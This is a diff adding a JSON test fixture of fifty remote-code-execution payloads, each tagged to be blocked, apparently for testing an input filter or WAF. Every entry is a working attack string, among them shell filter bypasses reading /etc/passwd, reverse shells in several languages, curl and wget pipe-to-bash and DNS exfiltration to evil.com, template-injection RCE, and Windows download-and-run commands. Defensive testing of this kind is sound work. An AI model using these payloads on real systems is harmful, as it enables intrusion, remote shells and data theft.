@@ -1,0 +1,452 @@
+[
+  {
+      "id": "RCE-POLY-001",
+      "payload": ";${IFS}cat${IFS}/etc/passwd",
+      "tags": ["ifs-bypass", "unix", "quick"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IFS variable space bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-002",
+      "payload": ";{cat,/etc/passwd}",
+      "tags": ["brace-expansion", "unix", "quick"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Bash brace expansion bypass",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-003",
+      "payload": ";cat$IFS/etc/passwd",
+      "tags": ["ifs-variable", "unix"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IFS variable without braces",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-004",
+      "payload": ";X=$'cat\\x20/etc/passwd'&&$X",
+      "tags": ["ansi-c", "hex-escape", "unix"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "ANSI-C quoting hex escape",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-005",
+      "payload": "| cat</etc/passwd",
+      "tags": ["input-redirect", "unix"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Input redirection without space",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-006",
+      "payload": "$(printf 'cat /etc/passwd')",
+      "tags": ["printf", "substitution"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Printf command construction",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-007",
+      "payload": "`echo$IFS'cat'$IFS'/etc/passwd'`",
+      "tags": ["echo-construction", "ifs"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Echo with IFS command construction",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-008",
+      "payload": ";/???/c?t /???/p?sswd",
+      "tags": ["glob", "wildcard", "unix"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Glob pattern matching",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-009",
+      "payload": ";/???/[c]at /???/[p]asswd",
+      "tags": ["glob", "bracket", "unix"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Bracket glob expression",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-010",
+      "payload": "${PATH:0:1}etc${PATH:0:1}passwd",
+      "tags": ["variable-slice", "path-inject"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "PATH variable slicing for slash",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-011",
+      "payload": "$(echo${IFS}id)",
+      "tags": ["echo-exec", "ifs"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Echo with IFS for execution",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-012",
+      "payload": ";$0<<<'id'",
+      "tags": ["here-string", "bash"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Here-string execution",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-013",
+      "payload": "a]||id||a[",
+      "tags": ["bracket-escape", "or-chain"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Bracket escape with OR chain",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-014",
+      "payload": "a]|id|a[",
+      "tags": ["bracket-escape", "pipe"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Bracket escape with pipe",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-015",
+      "payload": ";bash -c 'id'",
+      "tags": ["bash-c", "explicit"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Explicit bash -c execution",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-016",
+      "payload": ";sh -c 'id'",
+      "tags": ["sh-c", "explicit"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Explicit sh -c execution",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-017",
+      "payload": "|bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+      "tags": ["reverse-shell", "bash"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Bash reverse shell",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-018",
+      "payload": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+      "tags": ["reverse-shell", "python"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Python reverse shell",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-019",
+      "payload": "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton(\"10.0.0.1\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
+      "tags": ["reverse-shell", "perl"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Perl reverse shell",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-020",
+      "payload": "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "tags": ["reverse-shell", "php"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "PHP reverse shell",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-021",
+      "payload": "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+      "tags": ["reverse-shell", "ruby"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Ruby reverse shell",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-022",
+      "payload": "nc -e /bin/sh 10.0.0.1 4444",
+      "tags": ["reverse-shell", "netcat"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Netcat reverse shell with -e",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-023",
+      "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
+      "tags": ["reverse-shell", "netcat-fifo"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Netcat reverse shell with FIFO",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-024",
+      "payload": ";curl http://evil.com/shell.sh|bash",
+      "tags": ["remote-exec", "curl-pipe"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Curl pipe to bash",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-025",
+      "payload": ";wget -qO- http://evil.com/shell.sh|bash",
+      "tags": ["remote-exec", "wget-pipe"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Wget pipe to bash",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-026",
+      "payload": "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
+      "tags": ["nodejs", "prototype-chain"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Node.js prototype chain RCE",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-027",
+      "payload": "require('child_process').exec('id')",
+      "tags": ["nodejs", "require"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Node.js child_process require",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-028",
+      "payload": "__import__('os').system('id')",
+      "tags": ["python", "import"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Python __import__ RCE",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-029",
+      "payload": "eval(compile('import os;os.system(\"id\")','','exec'))",
+      "tags": ["python", "eval-compile"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Python eval/compile RCE",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-030",
+      "payload": "exec(\"import os;os.system('id')\")",
+      "tags": ["python", "exec"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Python exec RCE",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-031",
+      "payload": "getattr(getattr(__builtins__,'__import__')('os'),'system')('id')",
+      "tags": ["python", "getattr-chain"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Python getattr chain RCE",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-032",
+      "payload": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+      "tags": ["python", "ssti", "jinja2"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Jinja2 SSTI file read",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-033",
+      "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+      "tags": ["python", "ssti", "flask"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Flask config SSTI RCE",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-034",
+      "payload": "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+      "tags": ["java", "spring-el"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Spring Expression Language RCE",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-035",
+      "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+      "tags": ["java", "spring-el"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Spring EL with dollar sign",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-036",
+      "payload": "new java.lang.ProcessBuilder(new java.lang.String[]{\"id\"}).start()",
+      "tags": ["java", "process-builder"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Java ProcessBuilder RCE",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-037",
+      "payload": "${{<%[%'\"}}%\\",
+      "tags": ["polyglot", "ssti-detect"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "SSTI detection polyglot",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-038",
+      "payload": "{{7*7}}[[7*7]]${7*7}${{7*7}}#{7*7}*{7*7}",
+      "tags": ["polyglot", "ssti-math"],
+      "expected_block": true,
+      "severity_hint": "High",
+      "notes": "SSTI math evaluation polyglot",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-039",
+      "payload": ";echo${IFS}$(whoami)",
+      "tags": ["ifs", "nested-substitution"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "IFS with nested command substitution",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-040",
+      "payload": "||nslookup${IFS}$(whoami).evil.com||",
+      "tags": ["dns-exfil", "out-of-band"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "DNS exfiltration OOB",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-041",
+      "payload": ";ping${IFS}-c${IFS}1${IFS}$(whoami).evil.com",
+      "tags": ["icmp-exfil", "out-of-band"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "ICMP exfiltration OOB",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-042",
+      "payload": "cmd.exe /c \"whoami\"",
+      "tags": ["windows", "cmd"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Windows cmd.exe execution",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-043",
+      "payload": "powershell.exe -c \"whoami\"",
+      "tags": ["windows", "powershell"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "PowerShell command execution",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-044",
+      "payload": "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0A",
+      "tags": ["windows", "powershell", "encoded"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "PowerShell base64 encoded command",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-045",
+      "payload": "certutil -urlcache -split -f http://evil.com/shell.exe C:\\Windows\\Temp\\shell.exe",
+      "tags": ["windows", "lolbas", "certutil"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Certutil download LOLBAS",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-046",
+      "payload": "bitsadmin /transfer job /download /priority high http://evil.com/shell.exe C:\\Windows\\Temp\\shell.exe",
+      "tags": ["windows", "lolbas", "bitsadmin"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Bitsadmin download LOLBAS",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-047",
+      "payload": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc.exe\"\", 0:close\")",
+      "tags": ["windows", "lolbas", "mshta"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "MSHTA VBScript execution",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-048",
+      "payload": "regsvr32 /s /n /u /i:http://evil.com/shell.sct scrobj.dll",
+      "tags": ["windows", "lolbas", "regsvr32"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Regsvr32 SCT execution",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-049",
+      "payload": "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write(\"<script>new%20ActiveXObject('WScript.Shell').Run('calc.exe')</script>\")",
+      "tags": ["windows", "lolbas", "rundll32"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "Rundll32 JavaScript execution",
+      "category": "Injection"
+  },
+  {
+      "id": "RCE-POLY-050",
+      "payload": "wmic process call create \"cmd.exe /c whoami > C:\\out.txt\"",
+      "tags": ["windows", "wmic"],
+      "expected_block": true,
+      "severity_hint": "Critical",
+      "notes": "WMIC process creation",
+      "category": "Injection"
+  }
+]
